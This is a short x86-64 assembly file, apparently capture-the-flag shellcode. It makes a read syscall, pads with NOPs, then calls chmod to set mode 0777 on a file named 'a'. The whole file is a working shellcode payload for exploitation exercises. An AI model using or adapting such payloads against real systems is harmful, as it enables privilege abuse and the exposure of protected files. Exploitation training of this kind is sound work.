.global _start
.intel_syntax noprefix

_start:
	xor edi, edi
	mov esi, edx
	syscall
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	mov ebx, 0xfefd0061
	push rbx
	mov rdi, rsp
	mov al, 90
	#lea edi, [rip+file]
	mov esi, 0x030201ff
	syscall
	nop
	nop
	nop
	nop
	nop

